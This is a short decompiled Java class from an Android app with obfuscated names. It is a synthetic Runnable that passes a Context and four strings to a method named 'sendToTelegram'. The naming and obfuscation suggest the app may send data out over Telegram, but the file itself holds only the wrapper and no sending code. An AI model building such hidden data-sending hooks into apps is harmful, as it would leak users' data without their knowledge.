/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 */
package linker.resourcer.encoder;

import android.content.Context;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;

public final class ffbrxjknfnpfxahr$$ExternalSyntheticLambda2
implements Runnable {
    public final Context f$0;
    public final String f$1;
    public final String f$2;
    public final String f$3;
    public final String f$4;

    public /* synthetic */ ffbrxjknfnpfxahr$$ExternalSyntheticLambda2(Context context, String string2, String string3, String string4, String string5) {
        this.f$0 = context;
        this.f$1 = string2;
        this.f$2 = string3;
        this.f$3 = string4;
        this.f$4 = string5;
    }

    @Override
    public final void run() {
        ffbrxjknfnpfxahr.lambda$sendToTelegram$1(this.f$0, this.f$1, this.f$2, this.f$3, this.f$4);
    }
}

